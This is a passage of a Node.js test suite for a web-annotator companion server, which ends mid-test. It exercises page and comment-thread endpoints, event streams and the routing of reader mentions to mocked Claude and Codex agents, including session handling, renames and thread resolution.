#!/usr/bin/env node
// Endpoint + choreography tests for the web-annotator companion.
// No framework: sequential async checks, non-zero exit on the first failure
// class. The bridge is always the mock (test/mock-bridge.mjs) — the real
// python bridge is never spawned, and one server here runs with no mock at
// all to prove the bridge really is lazy.
//
//   node frontends/plugin/test/companion.test.mjs
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import net from 'node:net';
import http from 'node:http';
import path from 'node:path';
import zlib from 'node:zlib';
import crypto from 'node:crypto';
import { spawn, spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import {
  createHarness, sleep, request, GET, POST, FORM, getBytes, cookieJar,
} from './harness.mjs';
import { createRequire } from 'node:module';

// The reader's length instruction, verbatim (chat.mjs VERBOSITY_LINE): the last
// line of every turn. It carries the escape hatch too — a capped answer may keep
// its long half behind a <!--more--> marker rather than come out truncated.
const MORE_LINE = ' If there is genuinely more worth saying, keep the capped answer complete, then put a line containing exactly <!--more--> and write the long version after it — the reader gets it behind a "▸ more" they can open.';
const LEN_SHORT = 'Reply like a human in a chat: 2-3 crisp sentences, 60 words max, no essay structure, no filler — unless the reader explicitly asks for a longer or more detailed answer in their message; then take the space the question needs.' + MORE_LINE;
const LEN_LONG = 'Reply conversationally: at most 4-5 sentences, 120 words max — unless the reader explicitly asks for a longer or more detailed answer in their message; then take the space the question needs.' + MORE_LINE;


const TEST = path.dirname(fileURLToPath(import.meta.url));
const PLUGIN = path.resolve(TEST, '..');
const SERVER = path.join(PLUGIN, 'server.mjs');
const MOCK = path.join(TEST, 'mock-bridge.mjs');
const PLUGIN_DIR = PLUGIN;
// the extension's own anchoring code, loaded exactly as the phone loads it
const Anchor = createRequire(import.meta.url)(path.join(PLUGIN, 'extension', 'anchor.js'));
const store_hasSnapshot = (dir, key) => fs.existsSync(path.join(dir, 'snapshots', `${key}.html`));

// The scaffolding — runner, poller, throwaway root, a companion on a random
// port, JSON over HTTP — is test/harness.mjs, shared with every other suite
// that drives a real server. It was a private copy here, as in eight others.
//
// The 8s patience is this file's own, deliberately shorter than the tree's
// 10s: nothing here waits on more than one bridge child.
//
// ONE BRIDGE CHILD, everywhere in this file. Almost every test here is about
// what a single child is told and in what order — the choreography, the
// envelope, the sid capture — and it reads that off one shared mock log. A pool
// would split those lines across processes and prove nothing it was written to
// prove. `bridge_pool: 1` is also the exact behaviour that shipped before the
// pool existed, so this file remains the proof that the degenerate case still
// is what it was. Parallelism itself is test/parallel.test.mjs.
const {
  test, waitFor, tmp: tmpRoot, startServer, cleanup, spawned, SECRETS, passed, failures,
} = createHarness({
  server: SERVER, tag: 'x', waitMs: 8000, env: { PLUGIN_BRIDGE_POOL: '1' },
});


// SSE client: every event lands in `events`, tests wait on predicates
function openEvents(base, query = '') {
  const events = [];
  const req = http.get(base + '/events' + query, res => {
    let buf = '';
    res.on('data', c => {
      buf += c;
      let i;
      while ((i = buf.indexOf('\n\n')) >= 0) {
        const chunk = buf.slice(0, i); buf = buf.slice(i + 2);
        for (const line of chunk.split('\n')) {
          if (!line.startsWith('data: ')) continue;
          try { events.push(JSON.parse(line.slice(6))); } catch { }
        }
      }
    });
  });
  req.end();
  return { events, close: () => req.destroy() };
}
// minimal WS client: handshake + read one unmasked server text frame
function wsHello(base) {
  return new Promise((resolve, reject) => {
    const { hostname, port } = new URL(base);
    const key = crypto.randomBytes(16).toString('base64');
    const sock = net.connect(Number(port), hostname, () => {
      sock.write(`GET /ws HTTP/1.1\r\nHost: ${hostname}:${port}\r\nUpgrade: websocket\r\n`
        + `Connection: Upgrade\r\nSec-WebSocket-Key: ${key}\r\nSec-WebSocket-Version: 13\r\n\r\n`);
    });
    let buf = Buffer.alloc(0);
    sock.on('data', d => {
      buf = Buffer.concat([buf, d]);
      const head = buf.indexOf('\r\n\r\n');
      if (head < 0) return;
      const status = buf.slice(0, head).toString();
      const frames = buf.slice(head + 4);
      if (frames.length < 2) return;
      const len = frames[1] & 0x7f; // server frames are unmasked and small
      if (frames.length < 2 + len) return;
      sock.destroy();
      resolve({ status: status.split('\r\n')[0], payload: frames.slice(2, 2 + len).toString() });
    });
    sock.on('error', reject);
    setTimeout(() => { sock.destroy(); reject(new Error('ws timeout')); }, 4000);
  });
}
const inputs = logFile => fs.readFileSync(logFile, 'utf8').trim().split('\n')
  .filter(Boolean).map(l => JSON.parse(l)).filter(e => e.type === 'input').map(e => e.text);
const allLines = logFile => fs.readFileSync(logFile, 'utf8').trim().split('\n')
  .filter(Boolean).map(l => JSON.parse(l));

// --- fixtures -----------------------------------------------------------
const PAGE1 = 'https://ledger.test/2026/night-trains';
const PAGE2 = 'https://ledger.test/2026/track-charges';
const TITLE1 = 'The Quiet Return of the Night Train';
const QUOTE1 = 'The math only works if the trains run full.';
const ARTICLE = 'For most of the last two decades the night train was treated as a museum piece with a timetable.';
const ARTICLE2 = 'REWRITTEN: the sleeper order book has doubled since the draft you saw.';

// A real .docx, built here rather than checked in as a binary: the companion's
// zip reader has to walk a genuine central directory, so the test writes one
// (stored AND deflated entries, so both branches are exercised).
const crc32 = zlib.crc32 ? d => zlib.crc32(d) : () => 0;
function zipFile(entries) {
  const local = [];
  const central = [];
  let offset = 0;
  for (const e of entries) {
    const name = Buffer.from(e.name, 'utf8');
    const data = Buffer.from(e.data, 'utf8');
    const method = e.store ? 0 : 8;
    const comp = method ? zlib.deflateRawSync(data) : data;
    const crc = crc32(data);
    const head = Buffer.alloc(30);
    head.writeUInt32LE(0x04034b50, 0); head.writeUInt16LE(20, 4); head.writeUInt16LE(method, 8);
    head.writeUInt32LE(crc, 14); head.writeUInt32LE(comp.length, 18); head.writeUInt32LE(data.length, 22);
    head.writeUInt16LE(name.length, 26);
    local.push(head, name, comp);
    const cd = Buffer.alloc(46);
    cd.writeUInt32LE(0x02014b50, 0); cd.writeUInt16LE(20, 4); cd.writeUInt16LE(20, 6);
    cd.writeUInt16LE(method, 10); cd.writeUInt32LE(crc, 16);
    cd.writeUInt32LE(comp.length, 20); cd.writeUInt32LE(data.length, 24);
    cd.writeUInt16LE(name.length, 28); cd.writeUInt32LE(offset, 42);
    central.push(cd, name);
    offset += head.length + name.length + comp.length;
  }
  const cdBuf = Buffer.concat(central);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(entries.length, 8); eocd.writeUInt16LE(entries.length, 10);
  eocd.writeUInt32LE(cdBuf.length, 12); eocd.writeUInt32LE(offset, 16);
  return Buffer.concat([...local, cdBuf, eocd]);
}
const COMMENTS_XML = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
  + '<w:comments xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
  + '<w:comment w:id="1" w:author="Priya Raman" w:date="2026-08-01T09:00:00Z" w:initials="PR">'
  + '<w:p><w:r><w:t xml:space="preserve">The load-factor claim needs a </w:t></w:r>'
  + '<w:r><w:t>source.</w:t></w:r></w:p></w:comment>'
  + '<w:comment w:id="2" w:author="Tom &amp; Co" w:date="2026-08-02T11:30:00Z" w:initials="TC">'
  + '<w:p><w:r><w:t>Agreed &amp; noted.</w:t></w:r></w:p>'
  + '<w:p><w:r><w:t>Second paragraph of the same comment.</w:t></w:r></w:p></w:comment>'
  + '<w:comment w:id="3" w:author="Empty" w:date="2026-08-02T11:31:00Z"><w:p/></w:comment>'
  + '</w:comments>';
const docxB64 = () => zipFile([
  { name: '[Content_Types].xml', data: '<Types/>', store: true },
  { name: 'word/document.xml', data: '<w:document><w:body/></w:document>' },
  { name: 'word/comments.xml', data: COMMENTS_XML },
]).toString('base64');

async function main() {
  const root = tmpRoot('root');
  const vault = tmpRoot('vault');
  const logFile = path.join(root, 'bridge-log.jsonl');
  fs.mkdirSync(path.join(root, '.botference', 'plugin'), { recursive: true });
  fs.writeFileSync(path.join(root, '.botference', 'plugin', 'config.json'),
    JSON.stringify({ vault_path: vault, export_folder: 'Web Clippings', author: 'angadh' }, null, 2));

  const srv = await startServer({
    root,
    env: {
      PLUGIN_BRIDGE_CMD: JSON.stringify([process.execPath, MOCK]),
      MOCK_BRIDGE_LOG: logFile,
      MOCK_TURN_DELAY_MS: '250',
      PLUGIN_SID_WAIT_MS: '600', // the sid-capture wait, shortened for tests
    },
  });
  const base = srv.base;
  const stream = openEvents(base);
  await waitFor(() => stream.events.some(e => e.type === 'hello'), 'sse hello');

  // --- health / lazy bridge --------------------------------------------
  await test('health reports a stopped bridge before any mention', async () => {
    const r = await GET(base, '/health');
    assert.equal(r.status, 200);
    assert.deepEqual(r.json, { ok: true, bridge: 'stopped', queue: 0, queues: [],
      // the pool exists from the first moment; its child does not
      bridges: { live: 1, max: 1, workspace: 0, blog: 0 } });
    assert.equal(fs.existsSync(logFile), false, 'bridge must not spawn before a bot turn');
  });

  await test('GET /models before the bridge has ever run reports the empty state', async () => {
    const r = await GET(base, '/models');
    assert.deepEqual(r.json, {
      ok: true, current: null, options: null, status: null,
      // effort is the exception: the child's argparse defaults are knowable
      // before it exists, and no bridge event ever reports the live level
      effort: { current: { claude: 'high', codex: null }, options: null },
      verbosity: 'short',
      // which auth each agent would spawn with — status, never key material
      keys: { claude: 'unset', codex: 'unset', modes: { claude: 'auto', codex: 'auto' } },
      bridge: 'stopped',
    });
  });

  // --- the tab icon -----------------------------------------------------
  // Browsers ask for /favicon.ico whether or not anything linked it, so the
  // only two possible states are "serves the braid" and "404 in every log".
  await test('/favicon.ico serves the extension’s own icon', async () => {
    const r = await getBytes(base, '/favicon.ico');
    assert.equal(r.status, 200);
    assert.equal(r.headers['content-type'], 'image/png');
    const onDisk = fs.readFileSync(path.join(PLUGIN_DIR, 'extension', 'icons', 'icon128.png'));
    assert.ok(r.buf.equals(onDisk), 'the bytes are the icon file, unaltered');
    assert.equal(r.buf.subarray(0, 8).toString('latin1'), '\x89PNG\r\n\x1a\n', 'and they are a png');
    assert.match(String(r.headers['cache-control'] || ''), /max-age=\d+/, 'asked for once, then cached');
    // /favicon.png is the same picture under the name a <link> would use
    const png = await getBytes(base, '/favicon.png');
    assert.equal(png.status, 200);
    assert.ok(png.buf.equals(onDisk));
  });

  await test('every hosted view links it, so no tab is left blank', async () => {
    const pages = await GET(base, '/pages', { accept: 'text/html' });
    assert.match(pages.body, /<link rel="icon" type="image\/png" href="\/favicon\.ico">/);
  });

  await test('ws /ws upgrades and sends hello', async () => {
    const { status, payload } = await wsHello(base);
    assert.match(status, /101/);
    assert.equal(JSON.parse(payload).type, 'hello');
  });

  // --- page CRUD --------------------------------------------------------
  await test('GET /page on an unknown url returns page:null', async () => {
    const r = await GET(base, `/page?url=${encodeURIComponent(PAGE1)}`);
    assert.deepEqual(r.json, { ok: true, page: null });
  });

  await test('POST /page creates the shell record', async () => {
    const r = await POST(base, '/page', { url: PAGE1, title: TITLE1, site: 'ledger.test' });
    assert.equal(r.status, 200);
    assert.equal(r.json.version, 1);
    assert.equal(r.json.url, PAGE1);
    assert.equal(r.json.title, TITLE1);
    assert.equal(r.json.site, 'ledger.test');
    assert.equal(r.json.session_id, null);
    assert.deepEqual(r.json.threads, []);
    assert.deepEqual(r.json.page_chat, []);
    const key = crypto.createHash('sha1').update(PAGE1).digest('hex');
    assert.ok(fs.existsSync(path.join(root, '.botference', 'plugin', 'pages', `${key}.json`)));
  });

  await test('GET /index lists the page', async () => {
    const r = await GET(base, '/index');
    const key = crypto.createHash('sha1').update(PAGE1).digest('hex');
    assert.equal(r.json[key].url, PAGE1);
    assert.equal(r.json[key].threads, 0);
  });

  await test('url normalization folds utm params, hash and trailing slash', async () => {
    const messy = `${PAGE1}/?utm_source=newsletter&utm_medium=email#section-2`;
    const r = await GET(base, `/page?url=${encodeURIComponent(messy)}`);
    assert.equal(r.json.url, PAGE1, 'messy url must resolve to the same record');
  });

  // --- threads & replies ------------------------------------------------
  let t1 = null;
  await test('POST /thread creates a thread with the first message', async () => {
    const r = await POST(base, '/thread', {
      url: PAGE1, quote: QUOTE1, prefix: 'around and it costs. ', suffix: ' Operators talk about',
      msg: { text: 'This is the whole argument of the piece.' },
    });
    t1 = r.json.thread;
    assert.equal(r.json.ok, true);
    assert.match(t1.id, /^t-\d+-[0-9a-f]{4}$/);
    assert.equal(t1.orphaned, false);
    assert.equal(t1.msgs.length, 1);
    assert.equal(t1.msgs[0].author, 'angadh');
    assert.equal(r.json.queued, undefined, 'no mention → no bot turn');
  });

  await test('POST /reply appends to a thread and to the page chat', async () => {
    const a = await POST(base, '/reply', { url: PAGE1, thread_id: t1.id, text: 'Second thought.' });
    assert.equal(a.json.msg.text, 'Second thought.');
    const b = await POST(base, '/reply', { url: PAGE1, thread_id: '__page__', text: 'General note.' });
    assert.equal(b.json.ok, true);
    const page = (await GET(base, `/page?url=${encodeURIComponent(PAGE1)}`)).json;
    assert.equal(page.threads[0].msgs.length, 2);
    assert.equal(page.page_chat.length, 1);
    assert.equal(page.threads.length, 1);
  });

  await test('POST /reply to an unknown thread 404s', async () => {
    const r = await POST(base, '/reply', { url: PAGE1, thread_id: 't-nope', text: 'hi' });
    assert.equal(r.status, 404);
    assert.equal(r.json.ok, false);
  });

  await test('mutations broadcast page invalidation events', () => {
    assert.ok(stream.events.some(e => e.type === 'page' && e.url === PAGE1));
  });

  // --- the bot turn -----------------------------------------------------
  await test('a mention queues a turn, streams, and persists the reply', async () => {
    const before = stream.events.length;
    const r = await POST(base, '/reply', {
      url: PAGE1, thread_id: t1.id, text: '@claude does that hold outside peak season?',
      article_text: ARTICLE,
    });
    assert.equal(r.json.queued, true);
    assert.equal(r.json.position, 1);
    // the very first mention finds the bridge cold, and the answer says so:
    // the drawer shows "waking the agents…" instead of a flat "queued…" for
    // the ten or twenty seconds a spawn takes
    assert.equal(r.json.wait, 'bridge_starting',
      'the first mention reports that the bridge is being started');
    const since = () => stream.events.slice(before);
    const chat = kind => since().filter(e => e.type === 'chat' && e.kind === kind);
    await waitFor(() => chat('turn-start').length, 'turn-start');
    await waitFor(() => chat('turn-end').length, 'turn-end');
    assert.deepEqual(chat('turn-start')[0].agents, ['claude'], 'turn-start names the engaged agent');
    assert.deepEqual(chat('turn-end')[0].agents, ['claude'], 'turn-end echoes it');
    const reply = chat('reply')[0];
    assert.ok(reply, 'a reply event');
    assert.equal(reply.url, PAGE1);
    assert.equal(reply.target, t1.id);
    assert.equal(reply.msg.author, 'claude');
    assert.equal(reply.msg.text, 'MOCK claude reply.');
    const deltas = chat('stream').map(e => e.text).join('');
    assert.equal(deltas, 'MOCK claude reply.', 'streamed text accumulates to the final text');
    assert.equal(chat('stream')[0].model, 'claude');
    assert.ok(chat('stream-done').length, 'a stream-done event');
    assert.ok(since().some(e => e.type === 'bridge' && e.state === 'running'), 'bridge state event');
    const page = (await GET(base, `/page?url=${encodeURIComponent(PAGE1)}`)).json;
    // `kind` is what sort of document it is (the adapter's word, inferred from
    // the url where nothing said) and `session_title` is what the botference
    // chat behind it is currently called — both belong on the record. The
    // article text does not, and this list is how that stays true.
    assert.deepEqual(Object.keys(page), ['version', 'url', 'title', 'site', 'kind', 'created_at',
      'updated_at', 'session_id', 'threads', 'page_chat', 'session_title'],
    'article_text is never persisted');
    const msgs = page.threads[0].msgs;
    assert.equal(msgs.length, 4);
    assert.equal(msgs[3].author, 'claude');
    assert.equal(msgs[3].text, 'MOCK claude reply.');
  });

  await test('the session choreography reached the bridge in order', () => {
    const sent = inputs(logFile);
    assert.deepEqual(sent.slice(0, 4), [
      '/project create Plugin pages',
      '/project open plugin-pages',
      '/new',
      `/rename ${TITLE1}`,
    ]);
    const turn = sent[4];
    assert.ok(turn.startsWith('@claude '), 'route prefix from the mention');
    assert.ok(turn.includes(`[web page: "${TITLE1}" · ${PAGE1}]`), 'first-turn page context');
    assert.ok(turn.includes(ARTICLE), 'article text rides the first turn');
    assert.ok(turn.includes(`> ${QUOTE1}`), 'the highlighted quote');
    assert.ok(turn.includes('Earlier in this thread:\nangadh: This is the whole argument of the piece.'),
      'thread history above the new message');
    assert.ok(turn.includes('and wrote:\n@claude does that hold outside peak season?'));
    // The BODY ends with the reader's length instruction — nothing may come
    // between their question and how long the answer should be. What follows
    // it is the turn's offers (a strikeout where one is possible, a question
    // for the vault, the project roster), which ride after the body precisely
    // so they can never do that.
    assert.ok(turn.includes('comment thread.\n' + LEN_SHORT),
      'the body ends with the reader\'s length instruction');
    assert.ok(turn.indexOf(LEN_SHORT) < turn.indexOf('a real gap in the reader'),
      'and the question-vault offer rides after it, never before');
  });

  await test('the session id from the projects event is stored on the page', async () => {
    // the sid only becomes visible after the turn, so the capture is a wait
    const page = await waitFor(async () => {
      const p = (await GET(base, `/page?url=${encodeURIComponent(PAGE1)}`)).json;
      return p.session_id ? p : null;
    }, 'sid capture');
    assert.equal(page.session_id, 'sess-1');
  });

  await test('a second page gets its own /new, not another /project create', async () => {
    await POST(base, '/page', { url: PAGE2, title: 'Who Pays for the Small Hours', site: 'ledger.test' });
    const before = stream.events.length;
    const sentBefore = inputs(logFile).length;
    const r = await POST(base, '/thread', {
      url: PAGE2, quote: 'four different infrastructure managers', prefix: 'pays ', suffix: ', on four',
      msg: { text: '@all is this actually the binding constraint?' },
    });
    assert.equal(r.json.queued, true);
    await waitFor(() => stream.events.slice(before).some(e => e.kind === 'turn-end'), 'turn-end on page 2');
    const sent = inputs(logFile).slice(sentBefore);
    assert.deepEqual(sent.slice(0, 2), ['/new', '/rename Who Pays for the Small Hours']);
    assert.equal(inputs(logFile).filter(t => t.startsWith('/project create')).length, 1);
    assert.ok(sent[2].startsWith('@all '), '@all routes to the room');
    const start = stream.events.slice(before).find(e => e.kind === 'turn-start');
    assert.deepEqual(start.agents, ['claude', 'codex'], '@all engages both agents');
    const page = await waitFor(async () => {
      const p = (await GET(base, `/page?url=${encodeURIComponent(PAGE2)}`)).json;
      return p.session_id ? p : null;
    }, 'sid capture on page 2');
    // REGRESSION: the bridge's snapshot still says sess-1 while the new chat
    // is empty. Binding page 2 to sess-1 is the bug that put a new page in
    // another page's council chat.
    assert.equal(page.session_id, 'sess-2');
    assert.notEqual(page.session_id, 'sess-1', 'a new page never inherits the live session');
    const first = (await GET(base, `/page?url=${encodeURIComponent(PAGE1)}`)).json;
    assert.equal(first.session_id, 'sess-1', 'and page 1 keeps its own');
    assert.deepEqual(page.threads[0].msgs.map(m => m.author), ['angadh', 'claude', 'codex']);
  });

  await test('a page whose session is never confirmed stays unbound and says so', async () => {
    const url = 'https://ledger.test/2026/no-session';
    await POST(base, '/page', { url, title: 'No Session', site: 'ledger.test' });
    const before = stream.events.length;
    await POST(base, '/thread', {
      url, quote: 'unconfirmed', prefix: '', suffix: '',
      msg: { text: '@claude hello [mock:nosid]' },
    });
    const err = await waitFor(() => stream.events.slice(before)
      .find(e => e.type === 'chat' && e.kind === 'error'), 'capture failure error');
    assert.match(err.error, /couldn't create a session for this page/);
    assert.ok(stream.events.slice(before).some(e => e.kind === 'turn-end'), 'the turn still ends');
    const page = (await GET(base, `/page?url=${encodeURIComponent(url)}`)).json;
    assert.equal(page.session_id, null, 'better unbound than bound to a stranger');
    assert.equal(page.threads[0].msgs.length, 2, 'the reply is still kept');
  });

  await test('returning to the first page resumes its session', async () => {
    const before = stream.events.length;
    const sentBefore = inputs(logFile).length;
    await POST(base, '/reply', { url: PAGE1, thread_id: '__page__', text: '@claude one more thing' });
    await waitFor(() => stream.events.slice(before).some(e => e.kind === 'turn-end'), 'turn-end after resume');
    const sent = inputs(logFile).slice(sentBefore);
    assert.equal(sent[0], '/resume sess-1');
    assert.ok(!sent[1].includes('[web page:'), 'page context is a first-turn-only prefix');
    assert.ok(sent[1].includes('The user asked about this page:'), 'page-chat envelope');
    const page = (await GET(base, `/page?url=${encodeURIComponent(PAGE1)}`)).json;
    // the /resume replayed a `restored` room entry — it must not be persisted
    assert.deepEqual(page.page_chat.map(m => m.author), ['angadh', 'angadh', 'claude']);
  });

  // --- a rename follows the page into its chat, lazily -------------------
  // Renaming a page never wakes the bridge and never spends a turn of its own;
  // the NEXT thing that page has to say renames the botference chat behind it
  // first, and only once.
  await test('renaming a page renames its chat on the next turn, and only then', async () => {
    const url = 'https://ledger.test/2026/night-mail';
    await POST(base, '/page', { url, title: 'Night Mail', site: 'ledger.test' });
    let before = stream.events.length;
    await POST(base, '/thread', {
      url, quote: 'the mail still moves', prefix: '', suffix: '',
      msg: { text: '@claude does it?' },
    });
    await waitFor(() => stream.events.slice(before).some(e => e.kind === 'turn-end'), 'first turn');
    const born = await waitFor(async () => {
      const p = (await GET(base, `/page?url=${encodeURIComponent(url)}`)).json;
      return p.session_id ? p : null;
    }, 'sid capture');
    assert.equal(born.session_title, 'Night Mail', 'the record remembers what the chat was called');

    const sentBefore = inputs(logFile).length;
    const renamed = await POST(base, '/rename-page', { url, title: 'Night Mail (1936)' });
    assert.equal(renamed.status, 200);
    assert.equal(renamed.json.title, 'Night Mail (1936)');
    assert.deepEqual(inputs(logFile).slice(sentBefore), [], 'renaming spends no turn of its own');

    before = stream.events.length;
    await POST(base, '/reply', { url, thread_id: '__page__', text: '@claude and the sorting van?' });
    await waitFor(() => stream.events.slice(before).some(e => e.kind === 'turn-end'), 'second turn');
    const sent = inputs(logFile).slice(sentBefore);
    const rename = sent.indexOf('/rename Night Mail (1936)');
    assert.ok(rename >= 0, `the chat is renamed: ${JSON.stringify(sent)}`);
    const resume = sent.findIndex(t => t.startsWith('/resume '));
    if (resume >= 0) assert.ok(resume < rename, 'after the resume — the session renamed is this page\'s');
    assert.ok(sent.findIndex(t => t.startsWith('@claude ')) > rename, 'and before the turn itself');
    const after = (await GET(base, `/page?url=${encodeURIComponent(url)}`)).json;
    assert.equal(after.session_title, 'Night Mail (1936)');

    const sentAgain = inputs(logFile).length;
    before = stream.events.length;
    await POST(base, '/reply', { url, thread_id: '__page__', text: '@claude one more' });
    await waitFor(() => stream.events.slice(before).some(e => e.kind === 'turn-end'), 'third turn');
    assert.equal(inputs(logFile).slice(sentAgain).filter(t => t.startsWith('/rename ')).length, 0,
      'a name that has not moved is never renamed again');
  });

  await test('POST /interrupt reaches the bridge for the running page only', async () => {
    const before = stream.events.length;
    await POST(base, '/reply', { url: PAGE1, thread_id: '__page__', text: '@claude and another' });
    await waitFor(() => stream.events.slice(before).some(e => e.kind === 'turn-start'), 'turn-start');
    const wrong = await POST(base, '/interrupt', { url: 'https://elsewhere.test/x' });
    assert.equal(wrong.json.interrupted, false);
    const right = await POST(base, '/interrupt', { url: PAGE1 });
    assert.equal(right.json.interrupted, true);
    await waitFor(() => allLines(logFile).some(e => e.type === 'interrupt'), 'interrupt at the bridge');
    await waitFor(() => stream.events.slice(before).some(e => e.kind === 'turn-end'), 'turn-end');
  });

  // --- edit / delete / orphan -------------------------------------------
  await test('POST /orphan flags an anchor as lost', async () => {
    const r = await POST(base, '/orphan', { url: PAGE1, thread_id: t1.id, orphaned: true });
    assert.equal(r.json.thread.orphaned, true);
    const page = (await GET(base, `/page?url=${encodeURIComponent(PAGE1)}`)).json;
    assert.equal(page.threads[0].orphaned, true);
    await POST(base, '/orphan', { url: PAGE1, thread_id: t1.id, orphaned: false });
  });

  // --- resolving a thread ------------------------------------------------
  // The reader's page has more comments on it than they can hold in their
  // head, so a thread can be marked handled: it leaves the drawer's main list
  // for a collapsed archive and its highlight turns green. Everything about it
  // has to be SERVER state — the whole point is that the green is still there
  // on the next machine, months later.
  await test('POST /resolve files a thread, and the state is in the record', async () => {
    const before = (await GET(base, `/page?url=${encodeURIComponent(PAGE1)}`)).json;
    assert.equal(before.threads[0].resolved, undefined, 'nothing is resolved until somebody says so');

    const r = await POST(base, '/resolve', { url: PAGE1, thread_id: t1.id, resolved: true });
    assert.equal(r.status, 200);
    assert.equal(r.json.thread.resolved, true);
    assert.ok(r.json.thread.resolved_at, 'stamped');
    assert.ok(r.json.thread.resolved_by, 'and attributed — a reopen cannot recover who filed it');

    const page = (await GET(base, `/page?url=${encodeURIComponent(PAGE1)}`)).json;
    assert.equal(page.threads[0].resolved, true, 'it survives the round trip, which is the whole feature');
    assert.ok(page.threads[0].summary, 'and it is filed with a summary, written in the same request');
  });

  await test('resolving writes an instant digest — triage never waits on an agent', async () => {
    const page = (await GET(base, `/page?url=${encodeURIComponent(PAGE1)}`)).json;
    const t = page.threads[0];
    assert.ok(t.summary.length > 3, `a placeholder is there immediately: ${JSON.stringify(t.summary)}`);
    assert.equal(t.summary_by, undefined,
      'and it is nobody\'s: summary_by is what marks the agents\' own paragraph');
  });

  await test('the agents\' paragraph replaces the placeholder, and is NOT a message', async () => {
    const page = await waitFor(async () => {
      const p = (await GET(base, `/page?url=${encodeURIComponent(PAGE1)}`)).json;
      return p.threads[0].summary_by ? p : null;
    }, 'the summary job to drain');
    const t = page.threads[0];
    assert.match(t.summary, /MOCK (claude|codex) reply\./, 'the agent wrote it');
    assert.ok(['claude', 'codex'].includes(t.summary_by), 'attributed to the agent');
    // The one thing that must never happen: a summary landing as a reply would
    // append a message, and appending a message REOPENS the thread — so the
    // feature would silently undo itself on every use.
    assert.equal(t.resolved, true, 'summarizing a filed thread does not reopen it');
    assert.ok(!(t.msgs || []).some(m => /file a resolved comment thread/i.test(m.text || '')),
      'and nothing about the summary turn is in the thread');
  });

  await test('a summary turn asks for the 3-to-5-sentence shape, and says it is not a reply', async () => {
    const turn = inputs(logFile).filter(t => /file a resolved comment thread/.test(t)).pop();
    assert.ok(turn, 'a summary turn went out');
    assert.ok(/^@(claude|codex) /.test(turn), 'routed like any other turn');
    assert.ok(/3 to 5 sentences/.test(turn), 'the length the reader asked for');
    assert.ok(/what the question or the comment was/.test(turn) && /what the outcome was/.test(turn),
      'and the shape: what was asked, then what came of it');
    assert.ok(/nothing you write here is posted into the/.test(turn),
      'the agent is told this is filing, not answering');
    assert.ok(!/Your reply text is posted directly into the comment thread/.test(turn),
      'and is NOT told the opposite by the ordinary comment envelope');
  });

  await test('POST /resolve reopens, and a reopened thread keeps no resolved fields', async () => {
    const r = await POST(base, '/resolve', { url: PAGE1, thread_id: t1.id, resolved: false });
    assert.equal(r.status, 200);
    assert.equal(r.json.thread.resolved, undefined);
    assert.equal(r.json.thread.resolved_at, undefined);
    assert.equal(r.json.thread.resolved_by, undefined);
    const page = (await GET(base, `/page?url=${encodeURIComponent(PAGE1)}`)).json;
    assert.equal(page.threads[0].resolved, undefined, 'open again, and indistinguishable from never-resolved');
    assert.ok(page.threads[0].summary, 'the summary survives — it is still true, and a re-resolve reuses it');
  });

  // On their own page, because these tests put messages into a thread and
  // PAGE1's message counts are asserted on further down.
  const REOPEN_URL = 'https://ledger.test/2026/reopening';
  await test('a reply REOPENS a resolved thread — new activity is the end of resolved', async () => {
    await POST(base, '/page', { url: REOPEN_URL, title: 'Reopening', site: 'ledger.test' });
    const t = (await POST(base, '/thread', {
      url: REOPEN_URL, quote: 'the sleeper is the point', prefix: '', suffix: '',
      msg: { text: 'is this still true?' },
    })).json.thread;
    await POST(base, '/resolve', { url: REOPEN_URL, thread_id: t.id, resolved: true });
    assert.equal((await GET(base, `/page?url=${encodeURIComponent(REOPEN_URL)}`)).json.threads[0].resolved, true);
    await POST(base, '/reply', { url: REOPEN_URL, thread_id: t.id, text: 'actually, one more thing.' });
    const page = (await GET(base, `/page?url=${encodeURIComponent(REOPEN_URL)}`)).json;
    assert.equal(page.threads[0].resolved, undefined, 'writing into it makes it live again');
    assert.ok(page.threads[0].summary, '…and the paragraph it was filed with is still there, unused');
  });

  await test('…and so does a BOT reply landing in one', async () => {
    const page0 = (await GET(base, `/page?url=${encodeURIComponent(REOPEN_URL)}`)).json;
    const id = page0.threads[0].id;
    const before = stream.events.length;
    await POST(base, '/reply', { url: REOPEN_URL, thread_id: id, text: '@claude one last look?' });
    // the reader's own message already reopened it; resolve again UNDER the
    // running turn, so it is the bot's answer that has to do the reopening
    await POST(base, '/resolve', { url: REOPEN_URL, thread_id: id, resolved: true });
    await waitFor(() => stream.events.slice(before).some(e => e.kind === 'turn-end'), 'the turn');
    const page = await waitFor(async () => {
      const p = (await GET(base, `/page?url=${encodeURIComponent(REOPEN_URL)}`)).json;
      return p.threads[0].resolved === undefined ? p : null;
    }, 'the bot reply to reopen it');
    assert.ok(page.threads[0].msgs.some(m => /MOCK claude reply/.test(m.text)), 'the answer is in the thread');
  });

  // --- ready for review --------------------------------------------------
  // The middle state, and the reason it needs no new bot-side API: a bot's
  // reply landing in a thread is what marks it, and every write goes through
  // store.appendMsg, which the bridge's `reply` event already uses. Resolving
  // is untouched — a bot can say "I did this"; it can never close the reader's
  // question.
  const READY_URL = 'https://ledger.test/2026/ready';
  await test('a bot replying into a thread marks it READY FOR REVIEW, never resolved', async () => {
    await POST(base, '/page', { url: READY_URL, title: 'Ready', site: 'ledger.test' });
    const t = (await POST(base, '/thread', {
      url: READY_URL, quote: 'the sleeper is the point', prefix: '', suffix: '',
      msg: { text: '@claude can you fix the units here?' },
    })).json.thread;
    const page = await waitFor(async () => {
      const p = (await GET(base, `/page?url=${encodeURIComponent(READY_URL)}`)).json;
      return p.threads[0].addressed ? p : null;
    }, 'the bot answer to mark it');
    assert.equal(page.threads[0].id, t.id);
    assert.ok(page.threads[0].addressed_at, 'stamped');
    assert.match(String(page.threads[0].addressed_by), /^claude/, 'and the bot is named as the claimant');
    assert.equal(page.threads[0].resolved, undefined, 'the reader files it, and nothing else does');
  });

  await test('the READER writing there makes it their open question again', async () => {
    const id = (await GET(base, `/page?url=${encodeURIComponent(READY_URL)}`)).json.threads[0].id;
    await POST(base, '/reply', { url: READY_URL, thread_id: id, text: 'not quite — the second half.' });
    const p = (await GET(base, `/page?url=${encodeURIComponent(READY_URL)}`)).json;
    assert.equal(p.threads[0].addressed, undefined);
